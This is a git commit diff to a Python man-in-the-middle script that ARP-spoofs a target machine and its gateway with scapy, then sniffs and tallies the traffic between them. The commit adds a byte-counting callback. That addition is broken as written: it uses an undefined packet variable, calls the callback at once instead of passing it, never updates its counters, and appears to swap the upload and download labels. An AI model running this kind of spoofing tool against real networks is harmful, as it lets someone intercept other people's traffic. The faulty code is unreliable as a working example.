703e4dc942fee09961ae2101004a36e3bcd457bb
BeardDemon <75929039+LOIC-only-one@users.noreply.github.com>
2023-12-25 12:06:37 +0100

    Update main.py

--- attack_mitm/main.py
+++ attack_mitm/main.py
@@ -2,6 +2,20 @@ import time
 from scapy.all import ARP, getmacbyip, send, sniff
 from scapy.error import Scapy_Exception
 
+def capture(packet, target_ip, spoof_ip, data_volume_incoming, data_volume_outgoing):
+    # on vérifie si une couche IP existe
+    if packet.haslayer("IP"):
+        ip_src = packet["IP"].src
+        ip_dst = packet["IP"].dst
+        
+        # machine cible vers la passerelle
+        if ip_src == target_ip and ip_dst == spoof_ip:
+            data_volume_outgoing += len(packet)
+            
+        # passerelle vers la machine cible
+        elif ip_src == spoof_ip and ip_dst == target_ip:
+            data_volume_incoming += len(packet)
+
 def perform_arp_spoofing(target_ip, spoof_ip):
     try:
         target_mac = getmacbyip(target_ip)
@@ -25,6 +39,9 @@ def main():
         target_ip = input("Entrez l'adresse IP à écouter : ")
         spoof_ip = input("Quelle adresse IP à usurper : ")
         
+        data_volume_incoming = 0
+        data_volume_outgoing = 0
+
         while True:
             perform_arp_spoofing(target_ip, spoof_ip)
             perform_arp_spoofing(spoof_ip, target_ip)
@@ -32,7 +49,10 @@ def main():
             
     except KeyboardInterrupt:
         print("Capture en cours du trafic")
-        sniff(timeout=5, iface="Wi-Fi")
+        sniff(timeout=5, iface="Wi-Fi", prn=capture(packet, target_ip, spoof_ip, data_volume_incoming, data_volume_outgoing))
+        print(f"Volume de données montant : {data_volume_incoming} octets")
+        print(f"Volume de données descendant : {data_volume_outgoing} octets")
+        
         print("Rétablissement du cache ARP")
         restore(target_ip, spoof_ip)
         restore(spoof_ip, target_ip)
